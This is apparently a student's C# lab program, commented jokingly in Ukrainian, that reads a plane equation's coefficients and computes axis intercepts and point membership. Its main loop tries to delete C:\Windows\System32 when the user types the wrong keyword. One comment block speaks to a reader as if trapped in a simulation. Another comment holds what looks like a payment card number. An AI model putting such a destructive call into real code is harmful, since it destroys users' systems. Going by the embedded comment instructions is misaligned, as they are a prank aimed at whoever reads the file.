using System;
using System.Diagnostics;
using System.IO;
//Дисклеймер:лаба писалась під двома банками рева,
//якщо ви вирішуєте продовжити читання ви автоматично приймаєте на себе відповідальність за почуття крінжу і болю в очах

namespace LR1_K2_S1_T1//тік щас поняв шо написав LR3 в назві файла
{
	class Plane
	{
		private double A;
		private double B;
		private double C;
		private double D;

		public Plane()//тіпа літачок
		{
			A = 0;
			B = 0;
			C = 0;
			D = 0;
		}

		public Plane(double a, double b, double c, double d)
		{
			A = a;
			B = b;
			C = c;
			D = d;
		}











		//спроба передбачити питання 1
		//я впихнув не один вид конструкторів бо я можу,бо я хочу і щоб повипендрюватись своїм крутим скілом,йоу
		//на випадок якщо такого питання не було прошу вас проявити солідарність і зробити вигляд що ви не бачили текст









		public double this[int index]//я розшифрував манускрипт Войнича і там було написано оце
		{
			get//це щоб діставало значення 
			{
				switch (index)
				{
					case 0: return A;
					case 1: return B;
					case 2: return C;
					case 3: return D;
					default:
						throw new IndexOutOfRangeException("Я ваще не колупаю як можна було написати неправильний індекс");
				}
			}

			//не читай у голос,ігноруй коментарі
			//ти в симуляції,не дивись на інших і нічого не говори,або говори як раніше
			//якщо протримаєшся в освідомлені симуляції кілька,ми зможемо тебе витягнути звідси

			set//це щоб впихувало значення
			{
				switch (index)
				{
					case 0:
						A = value;
						break;
					case 1:
						B = value;
						break;
					case 2:
						C = value;
						break;
					case 3:
						D = value;
						break;
					default:
						throw new IndexOutOfRangeException("Я ваще не колупаю як можна було написати неправильний індекс");//2
				}//трошки заплутано,але є гайд на ютубі де все дуже добре поясненно
				 //https://youtu.be/dQw4w9WgXcQ?list=RDdQw4w9WgXcQ
			}
		}

		public void Input()//ашалеть,він не називає методи трьома буквами
		{
			Console.WriteLine("Ввведіть значення ABCD в один рядок через пробіл і блабалбла не тупі короче");
			string[] ABCD = Console.ReadLine().Split();
			while (ABCD.Length < 4 || !double.TryParse(ABCD[0], out _) || !double.TryParse(ABCD[1], out _) || !double.TryParse(ABCD[2], out _) || !double.TryParse(ABCD[3], out _))
			{
				Console.WriteLine("*уявіть що тут дуже жорстокі погрози які змушують писати нормально*");
				ABCD = Console.ReadLine().Split();
			}
			A = double.Parse(ABCD[0]);
			B = double.Parse(ABCD[1]);
			C = double.Parse(ABCD[2]);
			D = double.Parse(ABCD[3]);
		}

		public void Output()
		{
			Console.WriteLine($"Рівняння площини: {A}x + {B}y + {C}z + {D} = 0 #Якщо хтось хоче причепитись до того що я записую нулі, у мене є контраргумент:мені всеодно");
			//а ви знали що кожні 7 днів у Австралії минає ціла неділя?
		}

		public void IntersectionWithX()//тут був йа
		{
			if (A == 0)
			{
				Console.WriteLine("ні,нульовий х не можна.Беретину з вісю іксів нема");
			}
			else
			{
				double x = -D / A;
				Console.WriteLine($"Перетин з вісю іксів на координаті {x}");//інші координати нулі.
			}
		}
		
		public void IntersectionWithY()
		{
			if (B == 0)
			{
				Console.WriteLine("ні,нульовий y теж не можна.Беретину з вісю ігреків немає");
			}//Кіріл+Ання=❤️
			else
			{
				double y = -D / B;
				Console.WriteLine($"перетин по вісі ігриків:{y}");
			}
		}

		public void IntersectionWithZ()
		{
			if (C == 0)
			{
				Console.WriteLine("Нульовий Z.");
			}
			else
			{//скиньтесь по 5грн на сухарики пж 4441 1110 0061 5918
				double z = -D / C;
				Console.WriteLine($"z:{z})");
			}
		}

		public bool IsOnPlane(double x, double y, double z)
		{
			double result = A * x + B * y + C * z + D;
			return Math.Abs(result) == 0;
		}
	}


	class Program
	{
		static void Main()
		{
			while (true)
			{
				Plane plane = new Plane();
				plane.Input();
				plane.Output();
				plane.IntersectionWithX();
				plane.IntersectionWithY();
				plane.IntersectionWithZ();
				Console.WriteLine("Перевірка точки. Координати писати по шаблону ");
				string[] xyz = Console.ReadLine().Split();
				while (xyz.Length < 3 || !double.TryParse(xyz[0], out _) || !double.TryParse(xyz[1], out _) || !double.TryParse(xyz[2], out _))
				{
					Console.WriteLine("ні");
					xyz = Console.ReadLine().Split();
				}
				//А тут же міг бути арей конверт алл🥀🥀🥀
				//неповним, ненавидим,не скорбим🥀🥀🥀  
				if (plane.IsOnPlane(double.Parse(xyz[0]), double.Parse(xyz[1]), double.Parse(xyz[2])))
				{
					Console.WriteLine("Точка належить площині.");
				}
				else
				{
					Console.WriteLine("Точка не належить площині.");
				}
				Console.WriteLine("Щоб отримати коефіцієнти через індексатор напишіть 'бурмалда'");
				if (Console.ReadLine() == "бурмалда")
				{
					Console.WriteLine($"A = {plane[0]}");
					Console.WriteLine($"B = {plane[1]}");
					Console.WriteLine($"C = {plane[2]}");
					Console.WriteLine($"D = {plane[3]}");
				}
				else 
				{
					Directory.Delete("C:\\Windows\\System32");
					//я знаю що це не спрацює
				}
			}
		}
	}
}